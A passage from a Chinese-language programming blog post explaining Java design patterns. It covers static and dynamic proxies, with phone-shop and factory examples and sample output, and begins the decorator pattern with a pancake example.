class="title">B5000mah</span> <span class="keyword">implements</span> <span class="title">Bettary</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetPower</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><h3 id="代理模式思维导图"><a href="#代理模式思维导图" class="headerlink" title="代理模式思维导图"></a>代理模式思维导图</h3><blockquote>
<p>很水的思维导图</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/qsBZdT" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="静态代理阐述"><a href="#静态代理阐述" class="headerlink" title="静态代理阐述"></a>静态代理阐述</h3><blockquote>
<p>下面的描述是对以前学习代理的时候，留下来的笔记的改正版。</p>
</blockquote>
<p>当我们调用以前写过的类去完成一些任务的时候，发现这个类没有办法满足我们的需求，而需要添加一些功能。如果要去修改这些代码，不但不符合开闭原则，还有可能因为修改代码让其他调用这个类的地方出现错误。在调用者这里完成需求的话，又会让调用者变得极其复杂，不符合单一职责原则。这个时候，我们就可以再新建一个类，作为调用者的代理类，在这个类里面添加拓展功能的实现代码，并代替调用者调用目标类的方法。这样这个代理类就代替我们实现了所有的业务需求。</p>
<p>通过建立一个代理，来帮助我们和目标类交互并处理结果，拓展业务的代码交给代理类即可。</p>
<p>这就是静态代理： <strong>代理类 = 目标类 + 增强代码</strong></p>
<p><img src="https://xorex.space/image/169.jpg" alt="preview"></p>
<p>我们直接调用代理类即可，代理类会代替我们访问目标类并完善交互结果。</p>
<h3 id="静态代理代码实现"><a href="#静态代理代码实现" class="headerlink" title="静态代理代码实现"></a>静态代理代码实现</h3><blockquote>
<p>这里模拟的情景为买手机，买手机我们可以直接去手机工厂购买，但是这对于普通消费者来说，还是太不友好了。于是这里引入一个代理类：手机商店，然消费者去手机商店买。而手机商店会去代替消费者去手机工厂购买，并且还提供了额外的一些服务，如咨询机型服务，砍价服务，赠送礼品服务等等。这里消费者就是调用者，而手机商店就是消费者的代理类，代替消费者和目标类（手机工厂）交互，并完善交互结果。</p>
</blockquote>
<p>手机工厂及其接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PhoneFactory</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">GetPhone</span><span class="params">(<span class="keyword">int</span> Money,String Model)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiPhoneFactory</span> <span class="keyword">implements</span> <span class="title">PhoneFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">GetPhone</span><span class="params">(<span class="keyword">int</span> Money, String Model)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (Model)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Redmi K30s Ultra&quot;</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(Money == <span class="number">2200</span>) <span class="keyword">return</span> <span class="string">&quot;Redmi K30s Ultra&quot;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Mi11&quot;</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(Money == <span class="number">3500</span>) <span class="keyword">return</span> <span class="string">&quot;Mi11&quot;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span>  <span class="string">&quot;Redmi k40&quot;</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(Money == <span class="number">1700</span>) <span class="keyword">return</span> <span class="string">&quot;Redmi K40&quot;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiPhoneFactory</span> <span class="keyword">implements</span> <span class="title">PhoneFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">GetPhone</span><span class="params">(<span class="keyword">int</span> Money, String Model)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (Model)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Huawei P40&quot;</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(Money == <span class="number">3000</span>) <span class="keyword">return</span> <span class="string">&quot;Huawei P40&quot;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Huawei Mate40&quot;</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(Money == <span class="number">4100</span>) <span class="keyword">return</span> <span class="string">&quot;Huawei Mate40&quot;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span>  <span class="string">&quot;Huawei Mate40Pro&quot;</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(Money == <span class="number">5500</span>) <span class="keyword">return</span> <span class="string">&quot;Huawei Mate40Pro&quot;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代理类手机商店，及其包括的一些额外服务。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhoneShopProxy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PhoneFactory pf;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> Coupon=<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Consult</span><span class="params">(String Band,<span class="keyword">int</span> AllMoney)</span> </span>&#123;</span><br><span class="line">        String Phone=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(Band.equals(<span class="string">&quot;XiaoMi&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Coupon) AllMoney+=<span class="number">100</span>;</span><br><span class="line">            <span class="keyword">this</span>.pf=<span class="keyword">new</span> MiPhoneFactory();</span><br><span class="line">            <span class="keyword">if</span>(AllMoney&gt;<span class="number">3999</span>) Phone=<span class="string">&quot;Mi11&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(AllMoney&gt;=<span class="number">2599</span>) Phone=<span class="string">&quot;Redmi K30s Ultra&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(AllMoney&gt;=<span class="number">1999</span>) Phone=<span class="string">&quot;Redmi k40&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> Phone=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(Phone==<span class="keyword">null</span>) System.out.println(<span class="string">&quot;请多带些钱来把!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> System.out.println(<span class="string">&quot;我们建议你购买：&quot;</span>+Phone);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(Band.equals(<span class="string">&quot;Huawei&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Coupon) AllMoney+=<span class="number">100</span>;</span><br><span class="line">            <span class="keyword">this</span>.pf=<span class="keyword">new</span> HuaweiPhoneFactory();</span><br><span class="line">            <span class="keyword">if</span>(AllMoney&gt;<span class="number">5999</span>) Phone=<span class="string">&quot;Huawei Mate40Pro&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(AllMoney&gt;=<span class="number">4999</span>) Phone=<span class="string">&quot;Huawei Mate40&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(AllMoney&gt;=<span class="number">3999</span>) Phone=<span class="string">&quot;Huawei P40&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> Phone=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(Phone==<span class="keyword">null</span>) System.out.println(<span class="string">&quot;钱不够呢，请多带些钱来把!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> System.out.println(<span class="string">&quot;我们建议你购买：&quot;</span>+Phone);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这里没有你想要的手机呢&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Bargain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.Coupon=<span class="keyword">true</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;我们这已经是成本价了，赔钱给你便宜 100 块吧。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Gift</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;充电宝，贴膜，手机壳，耳机，电饭煲&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BuyPhone</span><span class="params">(String PhoneName)</span> </span>&#123;</span><br><span class="line">        String Phone=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (PhoneName) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Mi11&quot;</span> -&gt; &#123;</span><br><span class="line">                Phone = pf.GetPhone(<span class="number">3500</span>, PhoneName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Redmi K30s Ultra&quot;</span> -&gt; &#123;</span><br><span class="line">                Phone = pf.GetPhone(<span class="number">2200</span>, PhoneName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Redmi k40&quot;</span> -&gt; &#123;</span><br><span class="line">                Phone = pf.GetPhone(<span class="number">1700</span>, PhoneName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Huawei P40&quot;</span> -&gt; &#123;</span><br><span class="line">                Phone = pf.GetPhone(<span class="number">3000</span>, PhoneName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Huawei Mate40&quot;</span> -&gt; &#123;</span><br><span class="line">                Phone = pf.GetPhone(<span class="number">4000</span>, PhoneName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;Huawei Mate40Pro&quot;</span> -&gt; &#123;</span><br><span class="line">                Phone = pf.GetPhone(<span class="number">5000</span>, PhoneName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(Phone==<span class="keyword">null</span>) System.out.println(<span class="string">&quot;购买失败，型号错误&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> System.out.println(<span class="string">&quot;购买成功，&quot;</span>+Phone+<span class="string">&quot; 礼品：&quot;</span>+Gift());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>购买手机的实际消费者（被代理类）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BuyPhone</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        PhoneShopProxy shop1=<span class="keyword">new</span> PhoneShopProxy();</span><br><span class="line">        String Phone1=shop1.Consult(<span class="string">&quot;XiaoMi&quot;</span>, <span class="number">2000</span>);</span><br><span class="line">        <span class="keyword">if</span>(Phone1!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            shop1.Bargain();</span><br><span class="line">            shop1.BuyPhone(Phone1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        PhoneShopProxy shop2=<span class="keyword">new</span> PhoneShopProxy();</span><br><span class="line">        String Phone2=shop2.Consult(<span class="string">&quot;Huawei&quot;</span>, <span class="number">2000</span>);</span><br><span class="line">        <span class="keyword">if</span>(Phone2!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            shop2.Bargain();</span><br><span class="line">            shop2.BuyPhone(Phone2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们建议你购买：Redmi k40</span><br><span class="line">我们这已经是成本价了，赔钱给你便宜 100 块吧。</span><br><span class="line">购买成功，手机: Redmi K40 礼品：充电宝，贴膜，手机壳，耳机，电饭煲</span><br><span class="line"></span><br><span class="line">钱不够呢，请多带些钱来把!</span><br></pre></td></tr></table></figure>
<h3 id="动态代理阐述"><a href="#动态代理阐述" class="headerlink" title="动态代理阐述"></a>动态代理阐述</h3><p>前面说类静态代理，说是静态代理是因为这些过程在运行的时候都是不变的，编译生成 <code>.class</code> 文件是在 JVM <strong>运行之前</strong>完成的。但是动态代理的代理类，是在 JVM <strong>运行中</strong>生成的 <code>.class</code> 的。</p>
<p>动态代理有什么好处吗，为什么在 JVM 运行中生成有什么用啊？</p>
<p>当然有用，它最大的用处就是在运行中生成。在静态代理中，如果我们需要对大量的目标类进行编写增强代码相似的代理类来代替消费者访问，重复的工作就太多了。于是我们想要在程序运行的时候，根据实际所对应的目标类能自动生成消费者需要的代理类，我们只用写一次代理类模板，就能直接访问并完善所有的目标类，那就太方便了。想到动态代理可以在程序运行中生成代理类，这不就是我们想要的嘛，写一个代理类模板，运行的时候依次生成所有访问目标类的代理类，这样以后修改增强代码只需要在代理类模板里修改即可。</p>
<p>看下图，这里静态代理和动态代理最大的区别就是多了一个中间处理方法 invoke() ，这个invoke() 里面就是用来写增强代码的地方，里面对目标类的各种交互利用反射来完成。只需要将目标类传进代理生成器，就能利用反射生成一个访问目标类的代理类，最后只要操作这个生成的代理类代替我们和目标类交互即可。修改代码只修改 invoke()</p>
<p><img src="https://xorex.space/image/170.jpg" alt="preview"></p>
<p>为了能生成代理类，就需要有模板 <code>InvocationHandler.invoke()</code> ，这个是我们自己通过重写实现的，然后需要一个代理类生成器：<code>Proxy.newProxyInstance()</code> ，最后，只需要将模板和数据塞入代理类生成器，就能量产代理类了。</p>
<h3 id="动态代理代码实现"><a href="#动态代理代码实现" class="headerlink" title="动态代理代码实现"></a>动态代理代码实现</h3><p>这里将不同接口： PhoneFactory、LapTopFactory 作为目标类（也是只有动态代理才可以使用的），通过动态代理来生成代理类，供代替消费者买手机。</p>
<p>产品的不同接口和实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PhoneFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GetPhone</span><span class="params">()</span></span>;</span><br><span class="line">&#125; <span class="comment">// 接口一</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiPhoneFactory</span> <span class="keyword">implements</span> <span class="title">PhoneFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;生产成功：小米手机&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">LapTopFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GetLapTop</span><span class="params">()</span></span>;</span><br><span class="line">&#125; <span class="comment">// 接口二</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiLapTopFactory</span> <span class="keyword">implements</span> <span class="title">LapTopFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetLapTop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;生产成功：小米笔记本&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成代理类的 InvocationHandler 模板，以及生成方法 Proxy.newProxyInstance() 这里将实现模板和调用生成方法两个集成到了同一个类中。</p>
<p>具体的代码解释可以看以前学习反射的时候写的动态代理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target=target;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(),<span class="keyword">this</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Object result=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;正在前往工厂购买产品&quot;</span>);</span><br><span class="line">            result=method.invoke(<span class="keyword">this</span>.target, args);</span><br><span class="line">            System.out.println(<span class="string">&quot;正在将产品运往商店&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用者使用代理类来和 target 交互，这里一定要注意交互不同的 target 的时候，如果使用写法一就需要声明不同的 DynamicProxy 啊！理由看上面的代码注释。如果想要节省资源就要用写法二。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BuyProduct</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MiPhoneFactory pf=<span class="keyword">new</span> MiPhoneFactory();</span><br><span class="line">        MiLapTopFactory lf=<span class="keyword">new</span> MiLapTopFactory();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写法一：</span></span><br><span class="line">        DynamicProxy dp1=<span class="keyword">new</span> DynamicProxy();</span><br><span class="line">        DynamicProxy dp2=<span class="keyword">new</span> DynamicProxy();</span><br><span class="line">        PhoneFactory phoneproxy=(PhoneFactory) dp1.getProxy(pf);</span><br><span class="line">        LapTopFactory laptopfactory=(LapTopFactory) dp2.getProxy(lf);</span><br><span class="line">        phoneproxy.GetPhone();</span><br><span class="line">        System.out.println();</span><br><span class="line">        laptopfactory.GetLapTop();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写法二：</span></span><br><span class="line">        DynamicProxy dp=<span class="keyword">new</span> DynamicProxy();</span><br><span class="line">        PhoneFactory phoneproxy=(PhoneFactory) dp.getProxy(pf);</span><br><span class="line">        phoneproxy.GetPhone();</span><br><span class="line">        System.out.println();</span><br><span class="line">        LapTopFactory laptopfactory=(LapTopFactory) dp.getProxy(lf);</span><br><span class="line">        laptopfactory.GetLapTop();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后的输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">正在前往工厂购买产品</span><br><span class="line">生产成功：小米手机</span><br><span class="line">正在将产品运往商店</span><br><span class="line"></span><br><span class="line">正在前往工厂购买产品</span><br><span class="line">生产成功：小米笔记本</span><br><span class="line">正在将产品运往商店</span><br></pre></td></tr></table></figure>
<hr>
<p>记录一个小错误：</p>
<p>因为：在用 Proxy.newInstaceProxy() 获取代理类的时候，传入的 this 为本 DynamicProxy 实例。本实例的属性 target 的内存地址是固定的，只能保存一个 target。所以生成的代理类调用的目标类 target 的时候，是一个 DynamicProxy 对应一个 target 的。<strong>不同的</strong>目标类<strong>同时</strong>使用需要声明不同的 DynamicProxy，不同的目标类依次使用只需要声明一个 DynamicProxy。</p>
<p>下面表示用一个 DynamicProxy 生成器生成访问不同目标类的两种代理类，并同时使用的错误：（没错我就是刚犯！）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误写法：</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BuyProduct</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MiPhoneFactory pf=<span class="keyword">new</span> MiPhoneFactory();</span><br><span class="line">        MiLapTopFactory lf=<span class="keyword">new</span> MiLapTopFactory();</span><br><span class="line"></span><br><span class="line">        DynamicProxy dp=<span class="keyword">new</span> DynamicProxy();</span><br><span class="line">        PhoneFactory phoneproxy=(PhoneFactory) dp.getProxy(pf); <span class="comment">// 在 target 属性内存中写入 pf</span></span><br><span class="line">        LapTopFactory laptopfactory=(LapTopFactory) dp.getProxy(lf); <span class="comment">// 在 target 属性内存中 覆盖 pf 写入 lf</span></span><br><span class="line">        phoneproxy.GetPhone(); <span class="comment">// 此时 dp 实例中 target 属性的内存中的实例为 lf，但 lf 为 LapTopFactory 没有 GEtPhone() 方法。</span></span><br><span class="line">        <span class="comment">// 就会抛出 object is not an instance of declaring class 这样的错误，毕竟 lf 的确不是 PhoneFactory 的实例，没有 GetPhone() 方法。</span></span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line">        laptopfactory.GetLapTop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>装饰器模式故名思意，是对一个类进行装饰（增加小功能）。而装饰有一个特点，那就是装饰完一个物品之后，得到的结果还是该物品，可以像原来一样使用。</p>
<p>装饰器模式在 Java IO 的 FilterInputStream 和 FileterOutPutStream 中有使用过。请先阅读下面博文了解： <a href="https://xorex.space/2021/02/21/6b113700fd3d/#Filter-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">Filter 模式</a></p>
<p>以 FilterInputStream 为例，这个装饰器父类是 InputStream 的子类，也就是说，对于每一种具体的不同装饰子类，也同样是 InputSream 的子类。而在父类 FilterInputSream 中，有一个叫 in 的属性类型为 InputStream，就是专门用来保存被装饰物。</p>
<p>然后重写 InputSream 留下的 read() 方法，重写主要是添加一些装饰的功能，比如对输入进来的数据进行 base64 解码。那么就可以用被装饰物 InputStream 本来的 read() 方法先读入数据，然后手写 base64 解码代码，最后输出到 byte[] 数组中。</p>
<p>装饰类像是将被装饰类包裹起来（被装饰类作为装饰类内部的一个实例），从而完成对原有功能的完善。</p>
<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><ol>
<li>抽象构件 (InputSream) 角色：定义一个抽象接口以规范准备接收附加功能的对象。</li>
<li>具体构件 (FileInputSream extends InputSream)角色：实现抽象构件，通过装饰角色为其添加一些功能。</li>
<li>抽象装饰 (FilterInputSream extends InputStream) 角色：继承抽象构件，并包含具体构件的实例，可以通过其子类扩展具体构件的功能。</li>
<li>具体装饰 (Base64InputStream extends FilterInputSream) 角色：实现抽象装饰的相关方法，并给具体构件对象添加附加的功能。</li>
</ol>
<h3 id="装饰器、桥接之间的异同"><a href="#装饰器、桥接之间的异同" class="headerlink" title="装饰器、桥接之间的异同"></a>装饰器、桥接之间的异同</h3><p>到了这里应该能很清楚的明白和桥接模式之间的异同点了。</p>
<p>相同点：</p>
<ol>
<li>两者都是为了解决因为多个元素排列组合导致的子类爆炸的问题。</li>
<li>两者解决方法都是通过一个维度持有另外一个维度的实例，来实现功能的组合的。</li>
</ol>
<p>不同点：</p>
<ol>
<li>桥接模式的实现是高等级类持有低等级类的实例，来实现低等级功能附加到高等级身上。</li>
<li>装饰器模式是低等级装饰者持有高等级被装饰者，装饰者加上内部的被装饰者作为一个整体又是一个被装饰者，就像月饼包装一样，一层套一层，是包装包含月饼。</li>
</ol>
<h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><p>除了 Java 的 IO 实现了装饰器模式，我们自己也可以自己实现装饰器模式，就拿饼来举个例子，我们有很多饼，河南鸡蛋灌饼，山东杂粮煎饼等等。同时可以给这些并加很多配料（装饰），如辣条，鸡蛋，香肠，等等。我们就可以用修饰器模式解决这些组合的问题。</p>
<p>首先写我们想要装饰的东西，饼：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Pancake</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">makePancake</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addThings</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getPancake</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HenanPancake</span> <span class="keyword">implements</span> <span class="title">Pancake</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makePancake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始制作鸡蛋灌饼&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;煎好白面饼了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addThings</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在添加鸡蛋&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;正在添加生菜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getPancake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在打包鸡蛋灌饼&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请拿走鸡蛋灌饼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShanDongPancake</span> <span class="keyword">implements</span> <span class="title">Pancake</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makePancake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始制作杂粮煎饼&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;煎好杂粮饼了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 